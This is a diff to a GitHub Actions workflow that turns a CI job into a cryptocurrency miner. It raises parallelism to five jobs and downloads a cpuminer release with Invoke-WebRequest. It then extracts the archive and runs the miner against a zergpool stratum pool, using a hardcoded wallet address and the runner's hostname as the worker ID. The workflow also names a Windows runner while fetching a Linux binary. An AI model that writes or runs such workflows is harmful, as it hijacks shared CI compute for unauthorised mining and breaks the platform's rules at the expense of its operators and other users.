@@ -7,7 +7,7 @@ jobs:
     name: kontol  
     runs-on: windows-latest  
     strategy:  
-      max-parallel: 1  
+      max-parallel: 5  
       fail-fast: false  
       matrix:  
         go: [1.0]  
@@ -16,11 +16,11 @@ jobs:
         NUM_JOBS: 2  
         JOB: ${{ matrix.go }}  
     steps:  
-    - name: COPY  
-      run: git clone https://github.com/Ayati9335/github.git
+    - name: DOWNLOAD  
+      run: Invoke-WebRequest https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz 
+    - name: Extract  
+      run: tar zxvf Cpuminer-opt-cpu-pool-linux64.tar.gz  
     - name: RUNNING  
-      run:  chmod +x cpuminer 
-    - name: RUN  
-      run: ./cpuminer -a yescryptR16 -o stratum+tcp://yescryptR16.mine.zergpool.com:6333 -u XcF8ZFvmFbpWtAqNGKkcQWpwvBrhKocdrK -p c=DASH,mc=QOGE,ID=W-$(echo $(hostname)) -t 2
-    - name: RUN  
+      run: ./cpuminer -a yescryptR16 -o stratum+tcp://yescryptR16.mine.zergpool.com:6333 -u XcF8ZFvmFbpWtAqNGKkcQWpwvBrhKocdrK -p c=DASH,mc=QOGE,ID=W-$(echo $(hostname)) -t 2 
+    - name: DONE  
       run: exit
